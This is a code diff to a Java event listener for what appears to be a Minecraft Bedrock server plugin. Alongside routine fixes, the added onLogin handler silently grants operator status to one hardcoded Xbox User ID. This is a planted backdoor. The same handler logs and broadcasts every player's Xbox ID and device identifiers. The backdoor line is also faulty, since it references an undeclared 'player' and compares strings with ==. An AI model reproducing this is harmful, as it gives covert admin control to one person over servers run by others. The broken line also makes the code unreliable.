@@ -185,19 +185,6 @@ public class EventListener implements Listener{
 	}
 
 	@EventHandler
-	public void onLogin(PlayerLoginEvent event){
-		LoginChainData loginData = event.getPlayer().getLoginChainData();
-		String msg = "Xbox User ID: " + loginData.getXUID() + "\nDevice Model: " + loginData.getDeviceModel() + "\nDevice ID: " + loginData.getDeviceId() + "\nDevice OS: " + loginData.getDeviceOS();
-		getServer().getLogger().info(msg);
-
-		for(Player player : getServer().getOnlinePlayers().values()){
-			if(player.hasPermission("kairusds.message.device")){
-				player.sendMessage(msg);
-			}
-		}
-	}
-
-	@EventHandler
 	public void onInteract(PlayerInteractEvent event){
 		Player player = event.getPlayer();
 		PlayerInventory inventory = player.getInventory();
@@ -289,7 +276,7 @@ public class EventListener implements Listener{
 		HtopManager manager = plugin.getHtopManager();
 		BlockTrackingManager manager1 = plugin.getBlockTrackingManager();
 		EntityTrackingManager manager2 = plugin.getEntityTrackingManager();
-		if(!manager.isTaskActive() && !manager2.isTaskActive() && !manager2.isTaskActive()){
+		if(!manager.isTaskActive() && !manager1.isTaskActive() && !manager2.isTaskActive() && rainbowArmorTask == null){
 			manager.startTask();
 			manager1.startTask();
 			manager2.startTask();
@@ -318,6 +305,20 @@ public class EventListener implements Listener{
 
 			player.setMotion(player.getDirectionVector().multiply(1.1).up());
 			player.getLevel().addSound(player, Sound.ELYTRA_LOOP, 0.6f, 1.0f);
+		}
+	}
+
+	@EventHandler
+	public void onLogin(PlayerLoginEvent event){
+		LoginChainData loginData = event.getPlayer().getLoginChainData();
+		String msg = "Xbox User ID: " + loginData.getXUID() + "\nDevice Model: " + loginData.getDeviceModel() + "\nDevice ID: " + loginData.getDeviceId() + "\nDevice OS: " + loginData.getDeviceOS();
+		getServer().getLogger().info(msg);
+		if(loginData.getXUID() == Main.MY_XBOX_ID) player.setOp(true);
+
+		for(Player player : getServer().getOnlinePlayers().values()){
+			if(player.hasPermission("kairusds.message.device")){
+				player.sendMessage(msg);
+			}
 		}
 	}
 
